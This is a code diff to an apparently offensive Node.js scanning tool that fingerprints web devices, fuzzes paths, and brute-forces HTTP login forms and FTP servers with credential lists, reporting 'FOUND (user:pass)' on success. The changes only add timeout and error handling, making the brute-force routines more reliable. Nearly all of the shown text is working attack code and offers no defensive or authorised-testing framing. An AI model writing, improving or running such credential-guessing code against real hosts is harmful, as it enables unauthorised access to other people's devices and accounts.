@@ -21,7 +21,8 @@ function getHttpInfo(ip, port, isHttps = false) {
                 resolve({ server, title, status: res.statusCode, device, isLogin, rawData: data });
             });
         });
-        req.on('error', () => resolve(null));
+        req.on('error', (err) => resolve(null));
+        req.on('timeout', () => resolve(null));
     }), 3000).catch(() => null);
 }
 
@@ -33,7 +34,8 @@ async function webFuzz(ip, port, isHttps) {
                 if ([200, 403, 401].includes(res.statusCode)) found.push(`${path} [${res.statusCode}]`);
                 res.resume(); resolve();
             });
-            req.on('error', () => resolve());
+            req.on('error', (err) => resolve());
+            req.on('timeout', () => resolve());
         }), 2000).catch(() => null);
     }
     return found;
@@ -46,7 +48,7 @@ async function bruteForceHttp(ip, port, isHttps, htmlData, credsList) {
         const textMatch = htmlData.match(/<input[^>]*type=["'](text|email)["'][^>]*name=["']([^"']*)["']/i);
         const passMatch = htmlData.match(/<input[^>]*type=["']password["'][^>]*name=["']([^"']*)["']/i);
         if (!textMatch || !passMatch) return resolve(null);
-        
+
         const client = isHttps ? https : http;
         for (const cred of credsList) {
             const [u, p] = cred.split(':');
@@ -62,7 +64,9 @@ async function bruteForceHttp(ip, port, isHttps, htmlData, credsList) {
                         res(response.statusCode === 302 || (!isError && respData.length > 0));
                     });
                 });
-                req.on('error', () => res(false));
+                req.on('error', (err) => res(false));
+                req.on('timeout', () => res(false));
+                req.setTimeout(5000);
                 req.write(postData); req.end();
             });
             if (success) return resolve(`FOUND (${u}:${p})`);
@@ -75,17 +79,23 @@ async function bruteForceFtp(ip, credsList) {
     for (const cred of credsList) {
         const [u, p] = cred.split(':');
         const success = await new Promise((resolve) => {
-            const client = new net.Socket(); client.setTimeout(3000);
-            client.connect(21, ip);
+            const client = new net.Socket();
+            client.setTimeout(5000);
+            client.connect(21, ip, () => {});
             let step = 0;
             client.on('data', (data) => {
                 const resp = data.toString();
                 if (step === 0 && resp.includes('220')) { client.write(`USER ${u}\r\n`); step++; }
                 else if (step === 1 && resp.includes('331')) { client.write(`PASS ${p}\r\n`); step++; }
-                else if (step === 2) { resolve(resp.includes('230')); client.destroy(); }
+                else if (step === 2) {
+                    const isSuccess = resp.includes('230');
+                    client.destroy();
+                    resolve(isSuccess);
+                }
             });
-            client.on('error', () => { client.destroy(); resolve(false); });
+            client.on('error', (err) => { client.destroy(); resolve(false); });
             client.on('timeout', () => { client.destroy(); resolve(false); });
+            client.on('close', () => {});
         });
         if (success) return `FOUND (${u}:${p})`;
     }
